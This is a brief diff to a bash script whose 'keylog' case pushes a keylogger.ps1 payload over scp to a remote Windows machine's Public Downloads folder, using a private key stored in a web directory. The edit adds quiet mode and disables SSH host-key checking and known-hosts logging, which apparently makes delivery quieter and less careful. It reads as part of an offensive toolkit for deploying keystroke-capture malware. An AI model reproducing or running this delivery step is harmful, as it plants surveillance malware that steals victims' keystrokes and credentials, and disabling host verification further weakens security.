@@ -1,6 +1,6 @@
 #!/bin/bash
 case ${1} in
-keylog) scp -i /var/www/html/id_rsa.txt -P ${4} /var/www/html/keylogger.ps1 ${2}@${3}:/Users/Public/Downloads
+keylog) scp -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /var/www/html/id_rsa.txt -P ${4} /var/www/html/keylogger.ps1 ${2}@${3}:/Users/Public/Downloads
 
   ;;
 esac
